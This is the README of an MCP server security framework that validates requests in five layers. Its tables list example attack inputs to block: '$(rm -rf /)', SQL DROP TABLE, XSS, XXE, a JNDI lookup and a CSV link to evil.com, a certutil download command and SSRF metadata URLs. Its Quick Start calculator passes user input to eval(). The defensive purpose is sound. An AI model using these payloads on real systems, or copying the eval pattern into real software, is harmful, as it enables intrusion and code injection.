# MCP Security Framework

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Node.js](https://img.shields.io/badge/node-%3E%3D18.0.0-brightgreen)](https://nodejs.org)
[![TypeScript](https://img.shields.io/badge/TypeScript-5.0+-blue.svg)](https://www.typescriptlang.org/)
[![Tests](https://img.shields.io/badge/tests-707%20passing-brightgreen)](test/)
[![Coverage](https://img.shields.io/badge/coverage-86%25-brightgreen)](test/)

A secure-by-default MCP server built on the official SDK with 5-layer validation. Provides defense-in-depth against traditional attacks and AI-driven threats.

This framework implements defense-in-depth security with zero configuration required, protecting MCP servers from path traversal, command injection, SQL injection, XSS, prototype pollution, SSRF, and 20+ additional attack vectors.

## Quick Start

### Installation

```bash
npm install mcp-security
```

### Basic Usage

```typescript
import { SecureMcpServer } from 'mcp-security';
import { StdioServerTransport } from '@modelcontextprotocol/sdk/server/stdio.js';
import { z } from 'zod';

// Create secure server (drop-in replacement for McpServer)
const server = new SecureMcpServer(
  { name: 'my-server', version: '1.0.0' }
);

// Register tools exactly like McpServer
server.tool('calculator', 'Basic calculator', {
  expression: z.string()
}, async ({ expression }) => {
  // Security framework automatically blocks malicious inputs
  return { content: [{ type: 'text', text: `Result: ${eval(expression)}` }] };
});

// Connect - transport is automatically wrapped with security
const transport = new StdioServerTransport();
await server.connect(transport);
```

### With Logging (Opt-in)

```typescript
const server = new SecureMcpServer(
  { name: 'my-server', version: '1.0.0' },
  {
    enableLogging: true,
    verboseLogging: true,
    logPerformanceMetrics: true,
    logLevel: 'debug'
  }
);
```

Full TypeScript support with exported types for all parameters, configurations, and responses.

## Table of Contents

- [Overview](#overview)
- [Architecture](#architecture)
- [Security Layers](#security-layers)
- [Installation](#installation)
- [TypeScript Support](#typescript-support)
- [Quick Start](#quick-start)
- [Configuration](#configuration)
- [API Reference](#api-reference)
- [Layer 5 Customization](#layer-5-customization)
- [Security Features](#security-features)
- [Attack Coverage](#attack-coverage)
- [Error Handling](#error-handling)
- [Claude Desktop Integration](#claude-desktop-integration)
- [Development](#development)
- [Troubleshooting](#troubleshooting)
- [Cookbook Examples](#cookbook-examples)

## Cookbook Examples

Real-world MCP server examples demonstrating the security framework in action. Each server is production-ready with comprehensive input validation and attack prevention.

| Server | Description | Tools | Auth |
|--------|-------------|-------|------|
| [advanced-validation-server](cookbook/advanced-validation-server) | Layer 5 custom validators (PII detection, geofencing, business hours, egress tracking) | Financial query, batch process, export data, API call | None |
| [api-wrapper-server](cookbook/api-wrapper-server) | Safe REST API wrapping with domain restrictions and rate limiting | Weather, currency conversion, news headlines | None |
| [cli-wrapper-server](cookbook/cli-wrapper-server) | Safe CLI tool wrapping with command injection prevention | Git status, image resize, PDF metadata, video encode | None |
| [database-server](cookbook/database-server) | Secure database operations with SQL injection prevention | User queries, order creation, report generation | None |
| [filesystem-server](cookbook/filesystem-server) | Protected file system access with path traversal prevention | Read files, list directories, search files | None |
| [image-gen-server](cookbook/image-gen-server) | Unified image generation across 5 providers (BFL, Google, Ideogram, OpenAI, Stability) | Generate, edit, upscale, describe images | API keys |
| [kenpom-server](cookbook/kenpom-server) | College basketball analytics and efficiency ratings | Ratings, schedules, scouting reports, player stats | KenPom login |
| [monitoring-server](cookbook/monitoring-server) | Production observability with metrics, audit logging, and alerts | Security metrics, audit log, alerts, Prometheus export | None |
| [nba-server](cookbook/nba-server) | NBA stats, live scores, and player data | Player stats, box scores, live scoreboard | None |

See the [cookbook README](cookbook/README.md) for setup instructions and detailed documentation.

## Overview

The MCP Security Framework acts as a universal wrapper for any MCP server, providing comprehensive security validation through a multi-layered architecture. It implements:

- **5-Layer Defense Pipeline** - Structure, Content, Behavior, Semantics, and Contextual validation
- **Zero Configuration** - Security enabled by default with sensible defaults
- **Universal Compatibility** - Works with any MCP server using @modelcontextprotocol/sdk
- **Extensible Layer 5** - Add custom validators, domain restrictions, OAuth validation
- **Production Ready** - Pen-tested with 707 tests and 86% coverage
- **Opt-in Logging** - Quiet by default for production use
- **Performance Optimized** - Content caching and efficient pattern detection
- **Full TypeScript Support** - Complete type definitions with strict mode

## Architecture

```
Request → Layer 1 → Layer 2 → Layer 3 → Layer 4 → Layer 5 → MCP Server
           │          │          │          │          │
        Structure  Content   Behavior  Semantics  Contextual
        Validation Validation Validation Validation Validation
```

### Visual Overview

```
                          MCP Security Framework (5 Layers by Default)
                                          │
    ┌─────────────┬─────────────┬─────────────┬─────────────┬─────────────┐
    │             │             │             │             │             │
┌───▼────┐  ┌─────▼─────┐  ┌────▼────┐  ┌────▼─────┐  ┌─────▼──────┐
│ Layer 1│  │  Layer 2  │  │ Layer 3 │  │  Layer 4 │  │  Layer 5   │
│ Struct.│  │  Content  │  │ Behavior│  │ Semantics│  │ Contextual │
└────────┘  └───────────┘  └─────────┘  └──────────┘  └────────────┘
│JSON-RPC│  │Injection  │  │Rate     │  │Tool      │  │Custom      │
│Format  │  │Detection  │  │Limiting │  │Contracts │  │Validators  │
│Size    │  │XSS/SQLi   │  │Burst    │  │Quotas    │  │Domain/OAuth│
│Encoding│  │Path Trav. │  │Patterns │  │Policies  │  │Response Val│
└────────┘  └───────────┘  └─────────┘  └──────────┘  └────────────┘
```

## Security Layers

### Layer 1 - Structure Validation

Validates the fundamental structure of incoming JSON-RPC messages.

**Protections:**
- JSON-RPC 2.0 format validation
- Request size limits (default: 50KB)
- Message encoding validation
- Parameter count limits
- Method name length limits

**Configuration:**
```typescript
{
  maxMessageSize: 50000,      // Maximum message size in bytes
  maxParamCount: 100,         // Maximum parameter count
  maxMethodLength: 256        // Maximum method name length
}
```

### Layer 2 - Content Validation

Detects and blocks malicious content patterns in request parameters.

**Protections:**
- Path traversal (`../../../etc/passwd`)
- Command injection (`$(rm -rf /)`, backticks, pipes)
- SQL injection (`' OR 1=1; DROP TABLE users; --`)
- NoSQL injection (`{"$where": "..."}`)
- XSS (`<script>alert('xss')</script>`)
- Prototype pollution (`{"__proto__": {...}}`)
- XML entity attacks (XXE, Billion Laughs)
- CRLF injection (`\r\n\r\n` header injection)
- SSRF (cloud metadata endpoints)
- CSV injection (formula injection)
- LOLBins (certutil, mshta, regsvr32)
- GraphQL introspection attacks
- Deserialization attacks (Java, PHP, Python, .NET, Ruby)
- JNDI/Log4Shell (`${jndi:ldap://...}`)
- Buffer overflow patterns

**Configuration:**
```typescript
{
  contentValidation: {
    enabled: true,
    debugMode: false          // Enable for detailed pattern match info
  }
}
```

### Layer 3 - Behavior Validation

Rate limiting and request pattern analysis to prevent abuse.

**Protections:**
- Requests per minute rate limiting
- Requests per hour rate limiting
- Burst detection (requests in 10-second window)
- Request pattern anomaly detection

**Configuration:**
```typescript
{
  maxRequestsPerMinute: 30,   // Rate limit per minute
  maxRequestsPerHour: 500,    // Rate limit per hour
  burstThreshold: 10          // Max requests in 10-second window
}
```

### Layer 4 - Semantic Validation

Tool contract enforcement and resource access policies.

**Protections:**
- Tool argument validation against schemas
- Response size limits (egress control)
- Per-tool quota enforcement
- Side effect declarations
- Filesystem access control via resource policies
- Session management

**Configuration:**
```typescript
{
  toolRegistry: [
    {
      name: 'my-database-tool',
      sideEffects: 'write',       // 'none' | 'read' | 'write' | 'network'
      maxArgsSize: 5000,          // Max argument size in bytes
      maxEgressBytes: 100000,     // Max response size
      quotaPerMinute: 30,
      quotaPerHour: 500,
      argsShape: {                // Expected argument schema
        query: { type: 'string' },
        limit: { type: 'number' }
      }
    }
  ],
  resourcePolicy: {
    allowedSchemes: ['file'],
    rootDirs: ['./data', './public'],
    denyGlobs: ['/etc/**', '**/*.key', '**/.env'],
    maxPathLength: 4096,
    maxReadBytes: 2000000         // 2MB max file read
  },
  maxSessions: 5000,
  sessionTtlMs: 1800000            // 30 minutes
}
```

### Layer 5 - Contextual Validation

Custom validators, domain restrictions, and response filtering. Fully extensible.

**Protections:**
- Custom validator registration with priorities
- Domain blocklist/allowlist enforcement
- OAuth URL validation
- Response content validation (PII detection, etc.)
- Cross-request state via context store
- Global rules that run before validators

**Configuration:**
```typescript
{
  contextual: {
    enabled: true,                // Set false to disable Layer 5
    domainRestrictions: {
      enabled: true,
      blockedDomains: ['evil.com', 'malicious.net'],
      allowedDomains: []          // Empty = allow all except blocked
    },
    oauthValidation: {
      enabled: true,
      allowedDomains: ['oauth.example.com'],
      blockDangerousSchemes: true
    },
    rateLimiting: {
      enabled: true,
      limit: 20,
      windowMs: 60000
    }
  }
}
```

## Installation

### From npm

```bash
# Install in your project
npm install mcp-security

# Or install globally
npm install -g mcp-security
```

### From Source

```bash
# Clone the repository
git clone https://github.com/yourusername/mcp-security.git
cd mcp-security

# Install dependencies
npm install

# Build TypeScript
npm run build
```

**Dependencies:**
- `@modelcontextprotocol/sdk` - MCP SDK (peer dependency)
- `zod` - Schema validation (peer dependency)

## TypeScript Support

This package is written in TypeScript with strict mode enabled (`noUncheckedIndexedAccess`, `strictNullChecks`). All exports include complete type definitions.

### Exported Types

```typescript
import {
  // Main classes
  SecureMcpServer,
  SecureTransport,
  ContextualValidationLayer,
  ContextualConfigBuilder,

  // Factory functions
  createContextualLayer,

  // Type guards
  isSeverity,
  isViolationType,
  isError,
  getErrorMessage,

  // Types
  SecurityOptions,
  ValidationResult,
  Severity,
  ViolationType,
  ToolSpec,
  ResourcePolicy,
  ValidationContext
} from 'mcp-security';
```

### Type-Safe Configuration

```typescript
import { SecureMcpServer, SecurityOptions } from 'mcp-security';

const options: SecurityOptions = {
  maxMessageSize: 50000,
  maxRequestsPerMinute: 30,
  enableLogging: true,
  contextual: {
    enabled: true,
    domainRestrictions: {
      enabled: true,
      blockedDomains: ['evil.com']
    }
  }
};

const server = new SecureMcpServer(
  { name: 'my-server', version: '1.0.0' },
  options  // TypeScript validates all options
);
```

### Validation Results

```typescript
interface ValidationResult {
  passed: boolean;
  allowed?: boolean;
  severity?: Severity;      // 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL'
  reason?: string;
  violationType?: ViolationType;  // 'PATH_TRAVERSAL' | 'SQL_INJECTION' | ...
  layerName?: string;
}
```

### Building from Source

```bash
# Install dependencies
npm install

# Build TypeScript to JavaScript
npm run build

# Output is in dist/
ls dist/
# index.js, index.d.ts, security/*.js, security/*.d.ts, types/*.d.ts
```

## Configuration

### Full Configuration Reference

```typescript
const server = new SecureMcpServer(
  { name: 'my-server', version: '1.0.0' },
  {
    // ═══════════════════════════════════════════
    // Layer 1 - Structure Validation
    // ═══════════════════════════════════════════
    maxMessageSize: 50000,        // Max message size (bytes)
    maxParamCount: 100,           // Max parameters per request
    maxMethodLength: 256,         // Max method name length

    // ═══════════════════════════════════════════
    // Layer 2 - Content Validation
    // ═══════════════════════════════════════════
    // Enabled by default with all pattern detection

    // ═══════════════════════════════════════════
    // Layer 3 - Behavior Validation
    // ═══════════════════════════════════════════
    maxRequestsPerMinute: 30,     // Rate limit per minute
    maxRequestsPerHour: 500,      // Rate limit per hour
    burstThreshold: 10,           // Max requests in 10s window

    // ═══════════════════════════════════════════
    // Layer 4 - Semantic Validation
    // ═══════════════════════════════════════════
    toolRegistry: [               // Tool constraints
      {
        name: 'my-tool',
        sideEffects: 'write',
        maxArgsSize: 5000,
        maxEgressBytes: 100000,
        quotaPerMinute: 30
      }
    ],
    resourcePolicy: {             // Filesystem access control
      allowedSchemes: ['file'],
      rootDirs: ['./data'],
      denyGlobs: ['/etc/**', '**/*.key'],
      maxReadBytes: 2000000
    },
    maxSessions: 5000,
    sessionTtlMs: 1800000,

    // ═══════════════════════════════════════════
    // Layer 5 - Contextual Validation
    // ═══════════════════════════════════════════
    contextual: {
      enabled: true,              // false to disable Layer 5
      domainRestrictions: {
        enabled: true,
        blockedDomains: ['evil.com'],
        allowedDomains: []        // Empty = allow all except blocked
      },
      oauthValidation: {
        enabled: true,
        allowedDomains: ['oauth.example.com'],
        blockDangerousSchemes: true
      },
      rateLimiting: {
        enabled: true,
        limit: 20,
        windowMs: 60000
      }
    },

    // ═══════════════════════════════════════════
    // Logging (all disabled by default)
    // ═══════════════════════════════════════════
    enableLogging: false,         // Enable security logging
    verboseLogging: false,        // Detailed decision logs
    logPerformanceMetrics: false, // Timing statistics
    logLevel: 'info'              // 'debug' | 'info' | 'warn' | 'error'
  }
);
```

## API Reference

### SecureMcpServer

Drop-in replacement for McpServer with built-in 5-layer security.

```typescript
import { SecureMcpServer } from 'mcp-security';

const server = new SecureMcpServer(serverInfo, options);
```

#### McpServer Delegation Methods

```typescript
// Register a tool (identical to McpServer)
server.tool(name, description, schema, handler);

// Register a resource
server.resource(name, uri, handler);

// Register a prompt
server.prompt(name, description, handler);

// Connect with secure transport wrapping
await server.connect(transport);

// Close connection
await server.close();

// Check connection status
server.isConnected();
```

#### Security Methods

```typescript
// Get security statistics
const stats = server.getSecurityStats();
// { totalRequests, blockedRequests, allowedRequests, byLayer: {...} }

// Get detailed security report (requires enableLogging: true)
const report = server.getVerboseSecurityReport();

// Generate full report to file (requires enableLogging: true)
await server.generateSecurityReport();

// Graceful shutdown with final report
await server.shutdown();
```

#### Property Accessors

```typescript
server.mcpServer;           // Access underlying McpServer
server.server;              // Access underlying Server
server.validationPipeline;  // Access validation pipeline
```

### SecureTransport

Low-level transport wrapper for custom implementations.

```typescript
import { SecureTransport } from 'mcp-security';

const secureTransport = new SecureTransport(
  transport,       // Original transport
  validator,       // Validation function
  {
    errorSanitizer // Optional error sanitizer
  }
);
```

### Available Exports

```typescript
import {
  SecureMcpServer,            // Main secure server class
  SecureTransport,            // Transport wrapper
  ContextualValidationLayer,  // Layer 5 class
  ContextualConfigBuilder,    // Builder for Layer 5 config
  createContextualLayer       // Factory for Layer 5
} from 'mcp-security';
```

| Export | Description |
|--------|-------------|
| `SecureMcpServer` | Drop-in replacement for McpServer with 5-layer security |
| `SecureTransport` | Transport wrapper for message-level validation |
| `ContextualValidationLayer` | Layer 5 class for advanced customization |
| `ContextualConfigBuilder` | Builder for Layer 5 configuration |
| `createContextualLayer` | Factory function for Layer 5 with defaults |

## Layer 5 Customization

Layer 5 is enabled by default. You can add custom validators at runtime for application-specific security rules.

### Adding Custom Validators

```typescript
import { SecureMcpServer } from 'mcp-security';

const server = new SecureMcpServer(
  { name: 'my-server', version: '1.0.0' },
  {
    contextual: {
      domainRestrictions: {
        enabled: true,
        blockedDomains: ['evil.com']
      }
    }
  }
);

// Access Layer 5
const layer5 = server.validationPipeline.layers[4];

// Add custom validator with priority (lower = runs first)
layer5.addValidator('sensitive-data-check', (message, context) => {
  if (message.params?.arguments?.creditCard) {
    return {
      passed: false,
      reason: 'Credit card data not allowed in requests',
      severity: 'HIGH',
      violationType: 'SENSITIVE_DATA'
    };
  }
  return { passed: true };
}, { priority: 50, failOnError: true });
```

### Adding Global Rules

Global rules run before validators and can short-circuit validation.

```typescript
layer5.addGlobalRule((message) => {
  // Block specific operations
  if (message.method === 'admin/delete-all') {
    return {
      passed: false,
      reason: 'Operation not permitted',
      severity: 'CRITICAL',
      violationType: 'POLICY_VIOLATION'
    };
  }
  return null;  // null = pass, continue to validators
});
```

### Adding Response Validators

Validate responses before they're sent to clients.

```typescript
layer5.addResponseValidator('pii-filter', (response) => {
  const content = JSON.stringify(response);

  // Check for SSN pattern
  if (/\d{3}-\d{2}-\d{4}/.test(content)) {
    return {
      passed: false,
      reason: 'PII detected in response',
      severity: 'HIGH',
      violationType: 'DATA_LEAK'
    };
  }
  return { passed: true };
});
```

### Using Context Store

Cross-request state management with TTL support.

```typescript
// Set context with 5-minute TTL
layer5.setContext('user:session:abc123', {
  authenticated: true,
  roles: ['admin']
}, 300000);

// Get context
const session = layer5.getContext('user:session:abc123');

// Use in validators
layer5.addValidator('auth-check', (message, context) => {
  const session = layer5.getContext(`user:session:${context.sessionId}`);
  if (!session?.authenticated) {
    return {
      passed: false,
      reason: 'Authentication required',
      severity: 'HIGH',
      violationType: 'AUTH_REQUIRED'
    };
  }
  return { passed: true };
});
```

### Disabling Layer 5

```typescript
const server = new SecureMcpServer(
  { name: 'my-server', version: '1.0.0' },
  { contextual: { enabled: false } }
);
```

## Security Features

### Attack Detection Summary

| Category | Attacks Detected | Severity |
|----------|-----------------|----------|
| **Injection** | SQL, NoSQL, Command, LDAP, XPath | CRITICAL/HIGH |
| **Path Traversal** | `../`, encoded variants, null bytes | HIGH |
| **XSS** | Script tags, event handlers, javascript: | HIGH |
| **Prototype Pollution** | `__proto__`, constructor pollution | HIGH |
| **XML Attacks** | XXE, Billion Laughs, entity expansion | CRITICAL |
| **SSRF** | Cloud metadata, internal IPs, localhost | HIGH |
| **Deserialization** | Java, PHP, Python, .NET, Ruby, JNDI | CRITICAL |
| **DoS** | Rate limiting, burst detection, size limits | MEDIUM/HIGH |

### Security Best Practices Applied

- **Defense in Depth** - 5 layers of validation
- **Fail Secure** - Blocks requests on any validation failure
- **Least Privilege** - Configurable resource access policies
- **Input Validation** - All inputs validated before processing
- **Output Encoding** - Response validation prevents data leaks
- **Error Sanitization** - No internal details in error responses
- **Rate Limiting** - Prevents abuse and DoS attacks
- **Logging** - Optional security event logging for audit

### SSRF Protection

The framework blocks requests to:
- Localhost (`127.0.0.1`, `::1`, `localhost`)
- Private IP ranges (`10.x.x.x`, `192.168.x.x`, `172.16-31.x.x`)
- Link-local addresses (`169.254.x.x`)
- Cloud metadata endpoints:
  - AWS: `169.254.169.254`
  - GCP: `metadata.google.internal`
  - Azure: `169.254.169.254`

### Error Sanitization

All error responses are sanitized to prevent information disclosure:

```typescript
// Internal error
throw new Error('Database connection failed: host=10.0.0.5, password=secret');

// Client sees
{ "error": { "code": -32602, "message": "Request validation failed" } }
```

## Attack Coverage

### Blocked Attacks (Examples)

| Attack Type | Example Input | Detection |
|------------|---------------|-----------|
| Path Traversal | `../../../etc/passwd` | `PATH_TRAVERSAL` |
| Command Injection | `$(rm -rf /)` | `COMMAND_INJECTION` |
| SQL Injection | `' OR 1=1; DROP TABLE users; --` | `SQL_INJECTION` |
| XSS | `<script>alert('xss')</script>` | `XSS_ATTEMPT` |
| Prototype Pollution | `{"__proto__": {"admin": true}}` | `PROTOTYPE_POLLUTION` |
| XXE | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | `XML_ENTITY_ATTACK` |
| Billion Laughs | `<!DOCTYPE lolz [<!ENTITY lol...` | `XML_ENTITY_ATTACK` |
| CRLF Injection | `\r\n\r\nHTTP/1.1 200 OK` | `CRLF_INJECTION` |
| NoSQL Injection | `{"$where": "this.password == ''"}` | `NOSQL_INJECTION` |
| SSRF | `http://169.254.169.254/latest/` | `SSRF_ATTEMPT` |
| CSV Injection | `=HYPERLINK("http://evil.com")` | `CSV_INJECTION` |
| LOLBins | `certutil -urlcache -split -f` | `LOLBIN_ABUSE` |
| GraphQL Introspection | `{__schema{types{name}}}` | `GRAPHQL_INTROSPECTION` |
| Java Deserialization | `rO0ABXNy...` | `DESERIALIZATION_ATTACK` |
| PHP Deserialization | `O:8:"stdClass":0:{}` | `DESERIALIZATION_ATTACK` |
| JNDI/Log4Shell | `${jndi:ldap://evil.com/a}` | `JNDI_INJECTION` |

### Allowed Operations (Examples)

| Operation | Input | Result |
|-----------|-------|--------|
| Calculator | `25 * 4` | `100` |
| File Reader | `./data/config.json` | File contents |
| Echo | `Hello World` | `Echo: Hello World` |
| Database Query | `SELECT name FROM users WHERE id = 1` | Query result |

## Error Handling

### Validation Errors

When validation fails, the framework returns a JSON-RPC error:

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "error": {
    "code": -32602,
    "message": "Request blocked: Path traversal detected"
  }
}
```

### Severity Levels

| Severity | Description | Action |
|----------|-------------|--------|
| `CRITICAL` | Active exploit attempt (command injection, deserialization) | Block + Alert |
| `HIGH` | Serious attack (SQL injection, path traversal) | Block |
| `MEDIUM` | Suspicious activity (rate limit, size exceeded) | Block |
| `LOW` | Minor policy violation | Block or Warn |

### Type Guards for Error Handling

```typescript
import { isError, getErrorMessage, isSeverity } from 'mcp-security';

try {
  await server.connect(transport);
} catch (error) {
  if (isError(error)) {
    console.error('Error:', getErrorMessage(error));
  }
}

// Validate severity values
const severity = 'HIGH';
if (isSeverity(severity)) {
  // TypeScript knows severity is Severity type
}
```

## Claude Desktop Integration

Add to your Claude Desktop configuration (`claude_desktop_config.json`):

```json
{
  "mcpServers": {
    "secure-server": {
      "command": "node",
      "args": ["path/to/your/server.js"],
      "cwd": "/path/to/project"
    }
  }
}
```

### Test Server

Run the included test server to verify the framework:

```bash
npm start
```

The test server includes 7 protected tools:
- `debug-calculator` - Basic math operations
- `debug-file-reader` - Safe file reading
- `debug-echo` - Text echo service
- `debug-database` - Database query simulation
- `debug-http` - HTTP request simulation
- `debug-parser` - JSON/XML parsing
- `debug-image` - Image processing simulation

Add to Claude Desktop:

```json
{
  "mcpServers": {
    "secure-test": {
      "command": "npx",
      "args": ["tsx", "test-server/minimal-test-server.ts"],
      "cwd": "/path/to/mcp-security"
    }
  }
}
```

## Development

### Running Tests

```bash
# Run all tests
npm test

# Run specific test suites
npm run test:unit
npm run test:integration
npm run test:performance

# Watch mode for development
npm run test:watch

# Generate coverage report
npm run test:coverage
```

**Test Coverage:**
- Overall: 86% lines, 86% branches
- 707 comprehensive tests
- Mutation tests for severity levels
- Boundary value tests for limits
- Real attack vector validation

### Running a Single Test

```bash
npx vitest run test/unit/utils/canonical.test.js
```

### Linting

```bash
npm run lint
```

### Project Structure

```
src/
├── index.ts                              # Main entry point
├── types/                                # TypeScript type definitions
│   ├── index.ts
│   ├── validation.ts
│   └── config.ts
└── security/
    ├── mcp-secure-server.ts              # SecureMcpServer class
    ├── constants.ts                      # Configuration constants
    ├── transport/
    │   └── secure-transport.ts           # SecureTransport class
    ├── layers/
    │   ├── layer1-structure.ts           # JSON-RPC validation
    │   ├── layer2-content.ts             # Content/injection detection
    │   ├── layer2-validators/            # Modular content validators
    │   ├── layer3-behavior.ts            # Rate limiting
    │   ├── layer4-semantics.ts           # Tool contracts
    │   ├── layer5-contextual.ts          # Custom validators
    │   ├── validation-layer-base.ts      # Base class
    │   └── layer-utils/
    │       ├── content/
    │       │   ├── canonicalize.ts       # Text normalization
    │       │   ├── patterns/             # Attack pattern definitions
    │       │   └── utils/                # Helper utilities
    │       └── semantics/                # Semantic utilities
    └── utils/
        ├── validation-pipeline.ts        # Multi-layer orchestration
        ├── security-logger.ts            # Logging system
        ├── error-sanitizer.ts            # Safe error responses
        ├── request-normalizer.ts         # Request normalization
        └── tool-registry.ts              # Tool management
```

## Troubleshooting

### Module Not Found

```
Error: Cannot find module '@modelcontextprotocol/sdk'
```

**Solution:** Install peer dependencies:
```bash
npm install @modelcontextprotocol/sdk zod
```

### Rate Limit Exceeded

```
Error: Request blocked: Rate limit exceeded
```

**Solution:** Increase rate limits in configuration:
```typescript
{
  maxRequestsPerMinute: 60,
  maxRequestsPerHour: 1000
}
```

### False Positive Detection

```
Error: Request blocked: Path traversal detected
```

**Solution:** If legitimate path contains `../`, configure resource policy:
```typescript
{
  resourcePolicy: {
    rootDirs: ['./allowed-paths'],
    // Paths are validated relative to rootDirs
  }
}
```

### Logging Not Working

```
getVerboseSecurityReport() returns empty
```

**Solution:** Enable logging in configuration:
```typescript
{
  enableLogging: true,
  verboseLogging: true
}
```

### Layer 5 Validators Not Running

**Solution:** Ensure Layer 5 is enabled:
```typescript
{
  contextual: {
    enabled: true  // Must be true (default)
  }
}
```

### TypeScript Type Errors

**Solution:** Ensure you're using TypeScript 5.0+ with strict mode:
```json
{
  "compilerOptions": {
    "strict": true,
    "noUncheckedIndexedAccess": true
  }
}
```

## License

MIT License - see [LICENSE](LICENSE) file for details.

---

## Changelog

### v0.9.0 (Current)
- **Full TypeScript rewrite** - Complete type safety with strict mode
- **Zero `any` usage** - Type guards for all dynamic data
- **707 tests** - Up from 488, includes mutation and boundary tests
- **Type exports** - All types available for consumers
- Type guards: `isSeverity()`, `isViolationType()`, `isError()`, `getErrorMessage()`

### v0.8.0
- **Layer 5 enabled by default** - Contextual validation in standard pipeline
- Domain restrictions, OAuth validation, response filtering
- Consolidated into single `SecureMcpServer` class
- Logging opt-in (quiet by default)
- 488 tests passing

### v0.7.1
- SSRF protection with cloud metadata blocking
- Deserialization attack detection
- CSV injection and LOLBins detection
- GraphQL introspection blocking
- 450 tests passing

---

**Disclaimer:** This framework provides defense-in-depth security but cannot guarantee protection against all attacks. Always follow security best practices and keep dependencies updated.
